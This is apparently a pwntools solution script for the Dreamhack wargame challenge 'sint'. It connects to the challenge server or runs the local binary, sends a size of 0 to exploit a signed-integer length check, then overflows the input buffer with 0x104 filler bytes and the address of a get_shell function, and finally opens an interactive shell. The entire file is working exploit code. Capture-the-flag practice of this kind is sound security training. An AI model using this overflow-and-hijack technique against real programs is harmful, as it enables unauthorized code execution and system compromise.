#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  14218
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./sint', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.sendlineafter(b"Size: ", b'0')
offset = 0x104
p.sendlineafter(b"Data: ", b"a"*offset + p32(exe.sym.get_shell))


p.interactive()
